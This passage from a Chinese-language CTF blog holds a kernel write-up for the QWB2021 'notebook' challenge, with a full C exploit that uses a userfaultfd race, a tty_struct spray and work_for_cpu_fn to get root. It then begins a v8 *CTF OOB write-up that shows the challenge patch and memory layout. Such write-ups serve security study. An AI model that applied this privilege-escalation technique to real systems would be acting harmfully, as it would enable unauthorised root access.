PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory,userfault_stuck_handler);</span><br><span class="line">    note_fd = open(&quot;/dev/notebook&quot;, O_RDWR);</span><br><span class="line">	if (note_fd &lt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		ErrExit(&quot;[-] err in open notebook device&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">    noteadd(0,0x60,buf_a);</span><br><span class="line">    noteadd(1,0x60,buf_a);</span><br><span class="line">    noteedit(0,TTY_STRUCT_SZIE,buf_a);</span><br><span class="line">    noteedit(1,0x500,buf_a);</span><br><span class="line">    pthread_t thr_edit, thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit,NULL,edit_thread,0);</span><br><span class="line">    sleep(1);</span><br><span class="line">    pthread_create(&amp;thr_add,NULL,add_thread,0);</span><br><span class="line">    sleep(1);</span><br><span class="line">    puts(&quot;[+] ready to open ptmx&quot;);</span><br><span class="line">    for (int i = 0; i &lt; 20; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		tty_fd = open(&quot;/dev/ptmx&quot;, O_RDWR);</span><br><span class="line">		if (tty_fd &lt; 0)</span><br><span class="line">		&#123;</span><br><span class="line">			ErrExit(&quot;[-] ptmx open failed!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		read(note_fd, buf_tty, 0);</span><br><span class="line">		if (buf_tty[0] == 0x100005401)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;[+] tty_struct found! fd = %d\n&quot;, tty_fd);</span><br><span class="line">			break; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if (buf_tty[0] != 0x100005401)</span><br><span class="line">	&#123;</span><br><span class="line">		ErrExit(&quot;[-] leak failed&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/qwb2021-notebook/uaf.jpg" class="">
<p>在noteadd下断点，在第三次执行时看到，这个时候note0已经被另一个进程中的noteedit给free掉了，size变成了0，这个0会在copy_from_user之前的代码里被修改成60从而能在write函数中输入我们伪造的结构。代码后面的部分是通过喷射的方式来保证我们free掉的object被某个tty_struct申请走。</p>
<p>成功控制了一个tty_struct，就可以来进行地址泄漏和代码执行了。地址泄漏的部分就不多说了，在代码执行方面，比较主流的思路是进行内核rop，需要绕过semp和samp，除了这个之外，还有一个由长亭提出来的做法，利用work_for_cpu_fn来进行代码执行。<br><a href="https://zhuanlan.zhihu.com/p/385645268">长亭的解法</a></p>
<h4 id="work-for-cpu-fn（来自长亭的wp）"><a href="#work-for-cpu-fn（来自长亭的wp）" class="headerlink" title="work_for_cpu_fn（来自长亭的wp）"></a>work_for_cpu_fn（来自长亭的wp）</h4><p>控制 rip 之后，下一步就是绕过 SMEP 和 SMAP 了，这里介绍一种在完全控制了 tty 对象的情况下非常好用的 trick，完全不用 ROP，非常简单，且非常稳定（我们的 exploit 在利用成功和可以正常退出程序，甚至关机都不会触发 kernel panic）。<br>内核中有这样的一个函数：</p>
<img src="/qwb2021-notebook/ct-1.jpg" class="">
<p>其编译后大概长这样:</p>
<img src="/qwb2021-notebook/ct-2.jpg" class="">
<p>该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 “gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。由于内核中大量的 read &#x2F; write &#x2F; ioctl 之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。考虑到我们提权需要做的事情只是 commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。（如果还需要禁用 SELinux 之类的，再找一个任意地址写 0 的 gadget 即可，很容易找）</p>
<p>利用这个函数，我们来完成这个exp，需要注意的是，原来使用rop时，触发tty的虚函数可以使用write，但使用这个函数的话，由于tty_struct中+32属于write的一个信号量，会被修改导致利用失败，所以得直接使用ioctl，ioctl的参数直接抄的长亭的wp，至于为什么我也不知道，tty的ioctl非常复杂，难以分析，这点还是直接用长亭的比较方便。</p>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;syscall.h&gt;</span><br><span class="line">#include &lt;poll.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;linux/userfaultfd.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line">#define PAGE_SIZE 0x1000</span><br><span class="line">#define TTY_STRUCT_SZIE 0x2E0</span><br><span class="line"></span><br><span class="line">size_t work_for_cpu_fn_off = 0xffffffff8949eb90 - 0xffffffff8a28e440;</span><br><span class="line">size_t prepare_kernel_cred_off = 0xffffffffa14a9ef0 - 0xffffffffa228e440;</span><br><span class="line">size_t commit_creds_off = 0xffffffffa14a9b40 - 0xffffffffa228e440;</span><br><span class="line"></span><br><span class="line">int note_fd;</span><br><span class="line">void* stuck_mapped_memory;</span><br><span class="line"></span><br><span class="line">struct userarg</span><br><span class="line">&#123;</span><br><span class="line">	size_t idx;</span><br><span class="line">	size_t size;</span><br><span class="line">	void* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct notebook</span><br><span class="line">&#123;</span><br><span class="line">    void* note;</span><br><span class="line">    size_t size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void ErrExit(char* err_msg)</span><br><span class="line">&#123;</span><br><span class="line">    puts(err_msg);</span><br><span class="line">    exit(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void RegisterUserfault(void *fault_page,void *handler)</span><br><span class="line">&#123;</span><br><span class="line">    pthread_t thr;</span><br><span class="line">    struct uffdio_api ua;</span><br><span class="line">    struct uffdio_register ur;</span><br><span class="line">    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = 0;</span><br><span class="line">    if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)</span><br><span class="line">        ErrExit(&quot;[-] ioctl-UFFDIO_API&quot;);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (unsigned long)fault_page; //我们要监视的区域</span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1) //注册缺页错误处理</span><br><span class="line">        //当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span><br><span class="line">        ErrExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);</span><br><span class="line">    //开一个线程，接收错误的信号，然后处理</span><br><span class="line">    int s = pthread_create(&amp;thr, NULL,handler, (void*)uffd);</span><br><span class="line">    if (s!=0)</span><br><span class="line">        ErrExit(&quot;[-] pthread_create&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void noteadd(size_t idx,size_t size,void * buf)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    notearg.size = size;</span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    ioctl(note_fd,256,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void notedelete(size_t idx)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    ioctl(note_fd,512,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void noteedit(size_t idx, size_t newsize, void *buf)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    notearg.size = newsize;</span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    ioctl(note_fd,768,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void notegift(void *buf)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    ioctl(note_fd,100,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void userfault_stuck_handler(void* arg)</span><br><span class="line">&#123;</span><br><span class="line">    struct uffd_msg msg;</span><br><span class="line">    unsigned long uffd = (unsigned long) arg;</span><br><span class="line">    struct pollfd pollfd;</span><br><span class="line">    int nready;</span><br><span class="line">    puts(&quot;[+] stuck handler init&quot;);</span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, 1, -1);</span><br><span class="line">    pause();</span><br><span class="line">    if (nready != 1)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] Wrong poll return val&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, sizeof(msg));</span><br><span class="line">    if (nready &lt;= 0)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] msg err&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">    if (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] mmap err&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    struct uffdio_copy uc;</span><br><span class="line">    // init page</span><br><span class="line">    memset(page, 0, sizeof(page));</span><br><span class="line">    uc.src = (unsigned long) page;</span><br><span class="line">    uc.dst = (unsigned long) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - 1);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = 0;</span><br><span class="line">    uc.copy = 0;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    puts(&quot;[+] stuck handler done&quot;);</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void* edit_thread(int idx)</span><br><span class="line">&#123;</span><br><span class="line">	puts(&quot;[+] edit thread start!&quot;);</span><br><span class="line">	noteedit(idx, 0, stuck_mapped_memory);</span><br><span class="line">	puts(&quot;[+] edit thread end!&quot;); // won&#x27;t reach here</span><br><span class="line">	return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void* add_thread(int idx)</span><br><span class="line">&#123;</span><br><span class="line">	puts(&quot;[+] add thread start!&quot;);</span><br><span class="line">	noteadd(idx, 0x60, stuck_mapped_memory);</span><br><span class="line">	puts(&quot;[+] add thread end!&quot;); // won&#x27;t reach here</span><br><span class="line">	return NULL;</span><br><span class="line">&#125;</span><br><span class="line">char buf_a[0x500] = &#123;&quot;aaa&quot;&#125;;</span><br><span class="line">size_t buf_tty[0x100], buf_fake_table[0x500];</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int pid,tty_fd;</span><br><span class="line">    stuck_mapped_memory = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory,userfault_stuck_handler);</span><br><span class="line">    note_fd = open(&quot;/dev/notebook&quot;, O_RDWR);</span><br><span class="line">	if (note_fd &lt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		ErrExit(&quot;[-] err in open notebook device&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">    noteadd(0,0x60,buf_a);</span><br><span class="line">    noteadd(1,0x60,buf_a);</span><br><span class="line">    noteedit(0,TTY_STRUCT_SZIE,buf_a);</span><br><span class="line">    noteedit(1,0x500,buf_a);</span><br><span class="line">    pthread_t thr_edit, thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit,NULL,edit_thread,0);</span><br><span class="line">    sleep(1);</span><br><span class="line">    pthread_create(&amp;thr_add,NULL,add_thread,0);</span><br><span class="line">    sleep(1);</span><br><span class="line">    puts(&quot;[+] ready to open ptmx&quot;);</span><br><span class="line">    for (int i = 0; i &lt; 20; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		tty_fd = open(&quot;/dev/ptmx&quot;, O_RDWR);</span><br><span class="line">		if (tty_fd &lt; 0)</span><br><span class="line">		&#123;</span><br><span class="line">			ErrExit(&quot;[-] ptmx open failed!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		read(note_fd, buf_tty, 0);</span><br><span class="line">		if (buf_tty[0] == 0x100005401)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;[+] tty_struct found! fd = %d\n&quot;, tty_fd);</span><br><span class="line">			break; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if (buf_tty[0] != 0x100005401)</span><br><span class="line">	&#123;</span><br><span class="line">		ErrExit(&quot;[-] leak failed&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    size_t ptm_unix98_ops_addr = buf_tty[3];</span><br><span class="line">    if ((ptm_unix98_ops_addr &amp; 0xFFF) == 0x320) ptm_unix98_ops_addr += 0x120;</span><br><span class="line">    size_t work_for_cpu_fn_addr =  work_for_cpu_fn_off + ptm_unix98_ops_addr;</span><br><span class="line">    size_t tty_struct_addr = buf_tty[10] - 0x50;</span><br><span class="line">    size_t commit_creds_addr = commit_creds_off + ptm_unix98_ops_addr;</span><br><span class="line">    size_t prepare_kernel_cred_addr = prepare_kernel_cred_off + ptm_unix98_ops_addr;</span><br><span class="line">    size_t kernel_base = prepare_kernel_cred_addr - 0xA9EF0;</span><br><span class="line"></span><br><span class="line">    printf(&quot;[+] ptm_unix98_ops addr leaked, addr: 0x%lx\n&quot;, ptm_unix98_ops_addr);</span><br><span class="line">    printf(&quot;[+] work_for_cpu_fn addr leaked, addr: 0x%lx\n&quot;, work_for_cpu_fn_addr);</span><br><span class="line">    printf(&quot;[+] prepare_kernel_cred addr leaked, addr: 0x%lx\n&quot;, prepare_kernel_cred_addr);</span><br><span class="line">    printf(&quot;[+] tty_struct addr leaked, addr: 0x%lx\n&quot;, tty_struct_addr);</span><br><span class="line"></span><br><span class="line">    size_t gift[100];</span><br><span class="line">    notegift(gift);</span><br><span class="line">    size_t note0_addr = gift[0*2];</span><br><span class="line">    size_t note1_addr = gift[1*2];</span><br><span class="line">    assert(note0_addr == tty_struct_addr);</span><br><span class="line">    printf(&quot;[+] note1 addr leaked, addr: 0x%lx\n&quot;, note1_addr);</span><br><span class="line"></span><br><span class="line">    buf_tty[0] = 0x100005401;</span><br><span class="line">	buf_tty[3] = note1_addr;</span><br><span class="line">	buf_tty[4] = prepare_kernel_cred_addr;</span><br><span class="line">	buf_tty[5] = 0;</span><br><span class="line">	write(note_fd, buf_tty, 0); </span><br><span class="line"></span><br><span class="line">	buf_fake_table[7] = work_for_cpu_fn_addr;</span><br><span class="line">	buf_fake_table[10] = work_for_cpu_fn_addr;</span><br><span class="line">	buf_fake_table[12] = work_for_cpu_fn_addr;</span><br><span class="line">	write(note_fd, buf_fake_table, 1);</span><br><span class="line"></span><br><span class="line">	ioctl(tty_fd, 233, 233);</span><br><span class="line"></span><br><span class="line">	read(note_fd, buf_tty, 0);</span><br><span class="line">	printf(&quot;[+] prepare_kernel_cred finished, return 0x%lx\n&quot;, buf_tty[6]);</span><br><span class="line"></span><br><span class="line">	buf_tty[0] = 0x100005401;</span><br><span class="line">	buf_tty[3] = note1_addr;</span><br><span class="line">	buf_tty[4] = commit_creds_addr;</span><br><span class="line">	buf_tty[5] = buf_tty[6];</span><br><span class="line">	write(note_fd, buf_tty, 0);</span><br><span class="line">	sleep(1);</span><br><span class="line"></span><br><span class="line">	ioctl(tty_fd, 233, 233);</span><br><span class="line"></span><br><span class="line">	if (getuid() == 0)</span><br><span class="line">	&#123;</span><br><span class="line">		puts(&quot;[+] root now!&quot;);</span><br><span class="line">		system(&quot;/bin/sh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">        puts(&quot;[-] root failed&quot;);</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/qwb2021-notebook/win.jpg" class="">

<h2 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h2><p>1、内核pwn和常规的pwn其实本质一样，只不过非常复杂<br>2、碰到新问题不一定要照着前人的方法来套，分析目标最重要，在遇到新的内核问题时找不到思路，看内核源码还是有用的</p>
<p>参考链接：<br><a href="https://zhuanlan.zhihu.com/p/385645268">长亭科技-强网杯2021冠军队wp</a><br><a href="https://www.cjovi.icu/WP/1468.html">QWB2021-notebook-WP</a><br><a href="https://blog.csdn.net/lukuen/article/details/6935068">linux 内核堆管理机制</a><br><a href="https://paper.seebug.org/1153/">Linux 内核内存管理与漏洞利用</a></p>
]]></content>
      <categories>
        <category>linux内核pwn</category>
      </categories>
      <tags>
        <tag>linux内核pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器pwn学习——v8-oob</title>
    <url>/v8-oob/</url>
    <content><![CDATA[<p>我的第一个v8漏洞</p>
<span id="more"></span>
<h1 id="CTF-OOB"><a href="#CTF-OOB" class="headerlink" title="*CTF OOB"></a>*CTF OOB</h1><h2 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h2><p>来自*CTF的v8 pwn题，漏洞点比较简单，利用起来也不是很复杂，比较适合作为v8的入门</p>
<h2 id="题目环境搭建"><a href="#题目环境搭建" class="headerlink" title="题目环境搭建"></a>题目环境搭建</h2><p>v8是由google开发的java script引擎。由于特殊条件的限制，我们如果想要对它进行分析研究，就需要使用一些科学手段。科学手段操作方法这里不多讲了，参见下面的链接。<br><a href="https://mem2019.github.io/jekyll/update/2019/07/18/V8-Env-Config.html">https://mem2019.github.io/jekyll/update/2019/07/18/V8-Env-Config.html</a><br>配置完后，调整到对应v8版本并应用题目给的patch。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">git apply ../oob.diff</span><br><span class="line"></span><br><span class="line">./tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C ./out.gn/x64.release</span><br><span class="line"></span><br><span class="line">./tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C ./out.gn/x64.debug</span><br></pre></td></tr></table></figure>
<p>其中debug版本中存在检查，触发本题的漏洞时会做检查然后直接崩溃，这里编译出来只是为了看v8的一些内存结构，漏洞触发和调试均放在release版本上。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="v8对象结构"><a href="#v8对象结构" class="headerlink" title="v8对象结构"></a>v8对象结构</h3><p>js作为一个面向对象的语言，它的变量都是用类表示的。并且由于js是一个动态语言，它的类的成员是可以变得，这就导致它类的内存结构和C那些不太一样，复杂很多。<br>v8下类的派生结构图：</p>
<img src="/v8-oob/paishen.webp" class="">
<p>在v8里，js类的一般结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ class / map ] -&gt; ... ; 指向内部类或者数组对象的map对象</span><br><span class="line">[ properties  ] -&gt; [empty array]</span><br><span class="line">[ elements    ] -&gt; [empty array] ; 数值类型名称的属性</span><br><span class="line">[ reserved #1 ] -\</span><br><span class="line">[ reserved #2 ]  |</span><br><span class="line">[ reserved #3 ]  &#125;- in object properties,即预分配的内存空间</span><br><span class="line">...............  |</span><br><span class="line">[ reserved #N ] -/</span><br></pre></td></tr></table></figure>
<p>我们来用debug版的v8看看实际情况下是个什么情况<br>写一个测试用的js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
<p>以arraybuffer为例<br>arraybuffer的结构：</p>
<img src="/v8-oob/arraybuffer.PNG" class="">
<p>gdb看的内存：</p>
<img src="/v8-oob/neicun.PNG" class="">
<p>注意那个地址的最后，它的值看起来不是对齐的。这是因为v8里有个tagged pointer机制，一个地址指向的如果不是SMI（就是小整数)，它的最低位就会打上一个标记，就会有个1，看起来就不是对齐的，用的时候要减1。</p>
<p>在v8的类结构里面，和本题关系比较大的是map这个元素。这个元素简单来说就是v8用来指示这个对象里的数据如何被解析的。要注意的是v8解析对象类型靠的就是它，也就是说如果你能改变它，你就能让v8错误地解析一个对象。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>题目提供了一个patch文件，给我们造了个漏洞：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f <span class="number">100644</span></span><br><span class="line">--- a/src/bootstrapper.cc</span><br><span class="line">+++ b/src/bootstrapper.cc</span><br><span class="line">@@ <span class="number">-1668</span>,<span class="number">6</span> +<span class="number">1668</span>,<span class="number">8</span> @@ <span class="type">void</span> <span class="title function_">Genesis::InitializeGlobal</span><span class="params">(Handle&lt;JSGlobalObject&gt; global_object,</span></span><br><span class="line"><span class="params">                           Builtins::kArrayPrototypeCopyWithin, <span class="number">2</span>, <span class="literal">false</span>)</span>;</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;fill&quot;</span>,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, <span class="string">&quot;oob&quot;</span>,</span><br><span class="line">+                          Builtins::kArrayOob,<span class="number">2</span>,<span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;find&quot;</span>,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;findIndex&quot;</span>,</span><br><span class="line">diff --git a/src/builtins/builtins-<span class="built_in">array</span>.cc b/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">index <span class="number">8</span>df340e.<span class="number">.9</span>b828ab <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">+++ b/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">@@ <span class="number">-361</span>,<span class="number">6</span> +<span class="number">361</span>,<span class="number">27</span> @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   <span class="keyword">return</span> *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  <span class="comment">// namespace</span></span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    <span class="type">uint32_t</span> len = args.length();</span><br><span class="line">+    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; <span class="built_in">array</span> = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(<span class="built_in">array</span>-&gt;elements());</span><br><span class="line">+    <span class="type">uint32_t</span> length = static_cast&lt;<span class="type">uint32_t</span>&gt;(<span class="built_in">array</span>-&gt;length()-&gt;Number());</span><br><span class="line">+    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">+        <span class="comment">//read</span></span><br><span class="line">+        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">+        <span class="comment">//write</span></span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">+        elements.<span class="built_in">set</span>(length,value-&gt;Number());</span><br><span class="line">+        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index <span class="number">0447230.</span>.f113a81 <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-definitions.h</span><br><span class="line">+++ b/src/builtins/builtins-definitions.h</span><br><span class="line">@@ <span class="number">-368</span>,<span class="number">6</span> +<span class="number">368</span>,<span class="number">7</span> @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   <span class="comment">/* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */</span>   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayOob)                                                                \</span><br><span class="line">                                                                                \</span><br><span class="line">   <span class="comment">/* ArrayBuffer */</span>                                                            \</span><br><span class="line">   <span class="comment">/* ES #sec-arraybuffer-constructor */</span>                                        \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index ed1e4a5..c199e3a <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ <span class="number">-1680</span>,<span class="number">6</span> +<span class="number">1680</span>,<span class="number">8</span> @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       <span class="keyword">return</span> Type::Receiver();</span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayUnshift:</span><br><span class="line">       <span class="keyword">return</span> t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    <span class="keyword">case</span> Builtins::kArrayOob:</span><br><span class="line">+      <span class="keyword">return</span> Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// ArrayBuffer functions.</span></span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure>
<p>重点关注builtins-array.cc里面的改动，另外两个文件的改动只是为了让它正常工作。</p>
<p>这一段改动主要给array对象造了这么一个oob方法，功能为：<br>1、当参数只有一个（即我们在调用的时候什么也不传，因为所有方法都会有个this指针作为默认参数），就返回数组最后一个元素之后的元素<br>2、当参数有两个（即我们在调用的时候传一个参数），就用我们传入的参数覆盖数组最后一个元素之后的元素<br>3、其他情况下返回一个undefined</p>
<p>那么它返回和覆盖的究竟是个什么呢<br>我们用gdb调试看看</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
<img src="/v8-oob/jsarray.PNG" class="">
<p>箭头指向的是数组数据真正存放的地方，我们看看这片区域里有啥</p>
<img src="/v8-oob/mem1.PNG" class="">
<p>开头是的0x10是指向properties的指针和数组信息位，然后是数组的是个元素，然后在元素的后面，就是红圈圈着的那个，是指向数组对象map对象的指针。也就是说，这个oob方法能返回给我们数组对象的map，还能让我们修改它。</p>
<p>前面说过，map是v8用来判断对象类别的，我们能修改它，就能引起v8的类别混淆。这有什么用呢？我们用另外一个数组来说明</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1 = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1.1</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;<span class="string">&#x27;b&#x27;</span>:<span class="number">2.2</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> a = [obj1,obj2];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
<img src="/v8-oob/mem2.PNG" class="" title="avatar">

<img src="/v8-oob/mem3.PNG" class="" title="avatar">
